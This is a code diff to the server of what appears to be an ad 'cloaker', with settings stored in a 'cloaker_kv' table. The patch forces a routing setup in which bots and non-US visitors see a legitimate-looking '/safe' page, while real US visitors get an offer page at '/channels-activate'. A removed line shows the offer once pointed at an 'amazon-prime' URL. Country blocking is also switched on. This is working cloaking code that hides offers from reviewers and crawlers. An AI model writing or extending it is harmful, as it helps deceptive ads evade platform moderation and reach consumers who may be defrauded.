@@ -222,37 +222,15 @@ async function initDb() {
       console.log('Settings migration: allowedCountries set to [US]');
     }
 
-    // ── Startup migration: fix absolute URLs → relative paths ─────────────────
-    // (production DB may store full URLs like https://domain.com/page)
-    var _settingsDirty = false;
-    ['safeUrl', 'moneyUrl'].forEach(function(k) {
-      var v = _cacheSettings[k] || '';
-      if (v.match(/^https?:\/\//)) {
-        try { _cacheSettings[k] = new URL(v).pathname; _settingsDirty = true;
-          console.log('Settings migration: ' + k + ' absolute URL → ' + _cacheSettings[k]);
-        } catch(e) {}
-      }
-    });
-
-    // ── Startup migration: ensure safeUrl is /safe (not /not-found) ───────────
-    if (_cacheSettings.safeUrl === '/not-found' || !_cacheSettings.safeUrl) {
-      _cacheSettings.safeUrl = '/safe';
-      _settingsDirty = true;
-      console.log('Settings migration: safeUrl set to /safe');
-    }
-
-    // ── Startup migration: ensure moneyUrl is /channels-activate ─────────────
-    if (!_cacheSettings.moneyUrl || _cacheSettings.moneyUrl === '/offer' ||
-        _cacheSettings.moneyUrl.indexOf('amazon-prime') !== -1) {
-      _cacheSettings.moneyUrl = '/channels-activate';
-      _settingsDirty = true;
-      console.log('Settings migration: moneyUrl set to /channels-activate');
-    }
-
-    if (_settingsDirty) {
-      dbSaveSettings(_cacheSettings);
-      try { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(_cacheSettings, null, 2)); } catch(e) {}
-    }
+    // ── Startup migration: always enforce correct routing URLs ────────────────
+    // safeUrl  = /safe              (bots / non-US see the legitimate website)
+    // moneyUrl = /channels-activate (real US visitors see the offer page)
+    _cacheSettings.safeUrl  = '/safe';
+    _cacheSettings.moneyUrl = '/channels-activate';
+    _cacheSettings.countryBlockingEnabled = true;
+    dbSaveSettings(_cacheSettings);
+    try { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(_cacheSettings, null, 2)); } catch(e) {}
+    console.log('Settings migration: safeUrl=/safe moneyUrl=/channels-activate enforced');
 
     // ── Load sites ─────────────────────────────────────────────────────────────
     var stRes = await _dbPool.query("SELECT value FROM cloaker_kv WHERE key='sites'");
@@ -1951,27 +1929,12 @@ function migrateSettingsIfNeeded() {
     console.log('Settings migration: allowedCountries set to [US]');
   }
 
-  // Convert any absolute URLs to relative paths
-  ['safeUrl', 'moneyUrl'].forEach(function(k) {
-    var v = s[k] || '';
-    if (v.match(/^https?:\/\//)) {
-      try { s[k] = new URL(v).pathname; changed = true;
-        console.log('Settings migration: ' + k + ' absolute URL → ' + s[k]);
-      } catch(e) {}
-    }
-  });
-
-  // Ensure safeUrl = /safe
-  if (!s.safeUrl || s.safeUrl === '/not-found') {
-    s.safeUrl = '/safe'; changed = true;
-    console.log('Settings migration: safeUrl set to /safe');
-  }
-
-  // Ensure moneyUrl = /channels-activate
-  if (!s.moneyUrl || s.moneyUrl === '/offer' || (s.moneyUrl.indexOf('amazon-prime') !== -1)) {
-    s.moneyUrl = '/channels-activate'; changed = true;
-    console.log('Settings migration: moneyUrl set to /channels-activate');
-  }
+  // Always enforce correct routing URLs (handles swapped/wrong values)
+  s.safeUrl  = '/safe';
+  s.moneyUrl = '/channels-activate';
+  s.countryBlockingEnabled = true;
+  changed = true;
+  console.log('Settings migration: safeUrl=/safe moneyUrl=/channels-activate enforced');
 
   if (changed) writeSettings(s);
 }
